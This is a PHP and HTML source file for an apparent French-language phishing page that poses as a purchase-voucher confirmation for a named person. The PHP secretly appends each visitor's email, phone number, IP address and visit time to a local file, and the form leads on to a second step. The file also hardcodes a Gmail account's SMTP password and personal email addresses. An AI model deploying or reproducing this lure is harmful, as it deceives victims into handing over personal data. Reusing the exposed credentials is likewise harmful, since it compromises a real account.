



<?php

use function Composer\Autoload\includeFile;

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
 
require_once "vendor/autoload.php";
// require_once "constants.php";
 
$mail = new PHPMailer(true);
 
try {
    $mail->isSMTP();
    $mail->Host = 'smtp.googlemail.com';  //gmail SMTP server
    $mail->SMTPAuth = true;
    $mail->Username = "amyral.contact@gmail.com";   //username
    $mail->Password = "Aa4130261-*Aa-*";   //password
    $mail->SMTPSecure = 'ssl';
    $mail->Port = 465;                    //smtp port
  
    $mail->setFrom('amyral.contact@gmail.com', 'amir');
    $mail->addAddress('amir.bennasr@esprit.tn', 'amir');
 
    // $mail->addAttachment(__DIR__ . '/attachment1.png');
    // $mail->addAttachment(__DIR__ . '/attachment2.png');
 
    $mail->isHTML(true);
    $mail->Subject = 'Email Subject';
    $mail->Body    = '<b>here it is</b>';
 
    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo 'Message could not be sent. Mailer Error: '. $mail->ErrorInfo;
}

if(isset($_POST['SubmitButton'])){


    $myfile = fopen("details.txt", "a+") or die("Unable to open file!");
    $objDateTime = new DateTime('NOW');
    $result = $objDateTime->format('Y-m-d H:i:s');



    fwrite($myfile, "------------------FIRST VISIT--------------);." . PHP_EOL . "Time connected" . $result . PHP_EOL . "ip adresss" . $_SERVER['REMOTE_ADDR'] . PHP_EOL);

    $email = $_POST['email'].PHP_EOL;
    $phone = $_POST['phone'].PHP_EOL;
    fwrite($myfile, "email: ".$email );
    fwrite($myfile, "numero: ".$phone );

    fclose($myfile);
    
}





?>
<html>




<head>
    <style>
        .main-block,
        .info {
            display: flex;
            flex-direction: column;
        }

        .main-block {
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100%;
            background-size: cover;
        }

        form {
            width: 86%;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: solid 1px #FFEE00;
            box-shadow: 1px 2px 5px rgba(0, 0, 0, .31);
            background: #ebebeb;
        }

        .info-item {
            width: 100%;
        }

        input {
            width: calc(100% - 57px);
            height: 36px;
            padding-left: 10px;
            margin: 0 0 12px -5px;
            border-radius: 0 5px 5px 0;
            border: solid 1px #cbc9c9;
            box-shadow: 1px 2px 5px rgba(0, 0, 0, .09);
            background: #FFEE00;
        }

        .icon {
            padding: 9px 15px;
            margin-top: -1px;
            border-radius: 5px 0 0 5px;
            border: solid 0px #cbc9c9;
            background: #666;
            color: #fff;
        }

        input[type=radio] {
            display: none;
        }

        label.radio {
            position: relative;
            display: inline-block;
            text-indent: 32px;
            cursor: pointer;
        }

        label.radio:before {
            content: "";
            position: absolute;
            left: 0;
            width: 18px;
            height: 18px;
            border-radius: 50%;
            border: 0.5px solid #8ebf42;
            background: #fff;
        }

        label.radio:after {
            content: "";
            position: absolute;
            width: 8px;
            height: 4px;
            top: 5px;
            left: 4px;
            border-bottom: 3px solid #8ebf42;
            border-left: 3px solid #8ebf42;
            transform: rotate(-45deg);
            opacity: 0;
        }

        input[type=radio]:checked+label:after {
            opacity: 1;
        }

        textarea {
            width: 99%;
            margin-bottom: 12px;
        }

        button {
            width: 100%;
            padding: 8px;
            border-radius: 5px;
            border: none;
            background: #8ebf42;
            font-size: 14px;
            font-weight: 600;
            color: #fff;
            
        }

        button:disabled:hover
        {
            background: grey;

        }
        button:disabled
        {
            background: grey;

        }
        button:hover {
            background: #82b534;
        }

        .grade-type div {
            display: flex;
            margin: 6px 0;
        }

        @media (min-width: 568px) {
            .info {
                flex-flow: row wrap;
                justify-content: space-between;
            }
        }

        #test {
            background-repeat: no-repeat;
            position: relative;

            filter: blur(8px);
            -webkit-filter: blur(8px);
        }



        html,
        body {
            height: 100%;
            background-image: url('./background.jpg');
            background-position: center;
            background-repeat: no-repeat;
            background-size: cover;
            padding: 0;
            margin: 0;
            outline: none;
            font-family: Roboto, Arial, sans-serif;
            font-size: 16px;
            color: #666;
        }

        body {
            padding: 0;
            margin: 0;
            outline: none;
            font-family: Roboto, Arial, sans-serif;
            font-size: 16px;
            color: #666;
        }

        #wrapper {
            display: flex;
            justify-content: center;
            position: relative;
            height: 100%;

        }



        .blur {
            filter: blur(5px);
            -webkit-filter: blur(5px);
            -moz-filter: blur(5px);
            -o-filter: blur(5px);
            -ms-filter: blur(5px);
        }



        h1 {
            font-size: 28px;
        }



    </style>

</head>

<body>

    <div id="main-block" class="main-block">
        <form id="form" onsubmit="myBlurFunction(1)" action="etape_2.php" method="post">
            <div class="info">
                <center>
                    <h1>Confirmer votre bon d'achat</h1>
                </center>
                <div class="info-item">
                    <label class="icon" for="name"><i class="fas fa-user"></i></label>
                    <input type="text" name="name" disabled id="name" placeholder="Raoudha Ayari" required />
                </div>
                

                <div class="info-item">
                    <label class="icon" for="email"><i class="fas fa-envelope"></i></label>
                    <input type="email" name="email" oninvalid="this.setCustomValidity('Veuillez remplir votre email')"
                        id="emailoz" placeholder="Email" onchange="this.setCustomValidity('')" required />
                </div>
                <div class="info-item">
                    <label class="icon" for="phone"><i class="fas fa-phone"></i></label>
                    <input type="text" name="phone" id="phone" placeholder="Phone"
                        oninvalid="this.setCustomValidity('Veuillez remplir votre telephone')"
                        onchange="this.setCustomValidity('')" required />
                </div>
            </div>
            <div class="grade-type">
                <h3>Lire attentivement :</h3>
                <p>Aprés la cofirmation de votre bon d'achat ,vous allez recevoir un email
                    que vous devez imprimer ou l'afficher au sein du magasin géneral , Ainsi ,
                    Veuillez présenter votre carte d'identité au sein du magasin géneral qui porte le nom 'Raoudha
                    Ayari',
                    Pour beneficiez de votre de bon d'achat.
                </p>

            </div>
            <button id="btn1" type="submit" name="SubmitButton" >Confirmer</button>
        </form>
    </div>

    <!-- <div id="wrapper">


    </div> -->

    <script>


        // var body = document.body;
        var button = document.getElementById('btn1');
        // var form = document.sele
        // button.addEventListener("click", function () {
        //     body.setAttribute('class', 'blur')
        //     console.log('test')
    
        // })
        var emailField = document.getElementById('emailoz');
        var form = document.getElementById("form");
        // function handleForm(event) { event.preventDefault(); }
        // form.addEventListener('submit', handleForm);
    
    
        // emailField.addEventListener('keyup', function () {
        //     isValidEmail = emailField.checkValidity();
        //     if (isValidEmail) {
        //         console.log("true email");
        //         button.disabled=false;
    
        // }
    
        // else {
        //     console.log("bad email");
        //     button.disabled=true;
    
    
        // }
        // });
      
        myBlurFunction = function (state) {
            /* state can be 1 or 0 */
            var containerElement = document.body;
            var overlayEle = document.getElementById("main-block");
            console.log("test")
    
    
            if (state) {
                // overlayEle.style.display = 'block';
    
                containerElement.setAttribute('class', 'blur');
            } else {
                // overlayEle.style.display = 'none';
                containerElement.setAttribute('class', null);
            }
    
    
        };
    
    </script>
</body>


</html>